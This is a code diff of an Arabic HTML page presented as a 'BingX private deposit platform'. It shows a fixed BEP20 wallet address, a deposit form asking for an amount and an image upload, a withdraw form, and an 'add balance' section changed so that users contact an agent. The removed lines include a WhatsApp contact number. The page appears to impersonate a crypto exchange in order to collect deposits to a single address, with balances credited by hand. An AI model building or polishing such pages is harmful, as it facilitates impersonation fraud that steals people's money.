@@ -1,54 +1,31 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة الإيداع الخاصة BingX</title>
-    <link rel="stylesheet" href="style.css">
-</head>
-<body>
-    <div class="container">
-        <h1>منصة الإيداع الخاصة BingX</h1>
+<div class="container">
+    <h1>منصة الإيداع الخاصة BingX</h1>
 
-        <div id="balance">
-            <p>الرصيد الحالي: <span id="current-balance">0.00</span> USDT</p>
-        </div>
-
-        <div id="wallet-info">
-            <p><strong>عنوان المحفظة:</strong><br> 0x3932890a5d1acb3ab036bd39ade26c47929b37e5</p>
-            <p><strong>الشبكة:</strong> BEP20</p>
-        </div>
-
-        <div class="transaction-section">
-            <h2>إيداع</h2>
-            <input type="number" id="deposit-amount" placeholder="أدخل المبلغ للإيداع" required>
-            <input type="file" id="deposit-image" accept="image/*" required>
-            <button class="action-button" onclick="deposit()">إيداع</button>
-            <p id="deposit-status" class="hidden">إيداعك قيد الانتظار...</p>
-        </div>
-
-        <div class="transaction-section">
-            <h2>سحب</h2>
-            <input type="number" id="withdraw-amount" placeholder="أدخل المبلغ للسحب" required>
-            <button class="action-button" onclick="withdraw()">سحب</button>
-        </div>
-
-        <div class="admin-section">
-            <h2>إضافة رصيد</h2>
-            <input type="number" id="add-balance-amount" placeholder="أدخل المبلغ للإضافة" required>
-            <button class="action-button" onclick="addBalance()">إضافة رصيد</button>
-        </div>
+    <div id="balance">
+        <p>الرصيد الحالي: <span id="current-balance">0.00</span> USDT</p>
     </div>
 
-    <div id="sidebar" class="sidebar">
-        <button class="close-btn" onclick="closeSidebar()">×</button>
-        <h2>تواصل معنا</h2>
-        <p>للتواصل عبر واتساب:</p>
-        <a href="https://wa.me/+212784607357" target="_blank" class="whatsapp-button">إرسال رسالة عبر واتساب</a>
+    <div id="wallet-info" class="wallet-box">
+        <p><strong>عنوان المحفظة:</strong><br> 0x3932890a5d1acb3ab036bd39ade26c47929b37e5</p>
+        <p><strong>الشبكة:</strong> BEP20</p>
     </div>
 
-    <button class="open-btn" onclick="openSidebar()">تواصل معنا</button>
+    <div class="transaction-section">
+        <h2>إيداع</h2>
+        <input type="number" id="deposit-amount" placeholder="أدخل المبلغ للإيداع" required>
+        <input type="file" id="deposit-image" accept="image/*" required>
+        <button class="action-button" onclick="deposit()">إيداع</button>
+        <p id="deposit-status" class="hidden">إيداعك قيد الانتظار...</p>
+    </div>
 
-    <script src="script.js"></script>
-</body>
-</html>
+    <div class="transaction-section">
+        <h2>سحب</h2>
+        <input type="number" id="withdraw-amount" placeholder="أدخل المبلغ للسحب" required>
+        <button class="action-button" onclick="withdraw()">سحب</button>
+    </div>
+
+    <div class="admin-section">
+        <h2>إضافة رصيد</h2>
+        <button class="action-button" onclick="requestBalanceUpdate()">تواصل مع الوكيل لإضافة رصيد</button>
+    </div>
+</div>
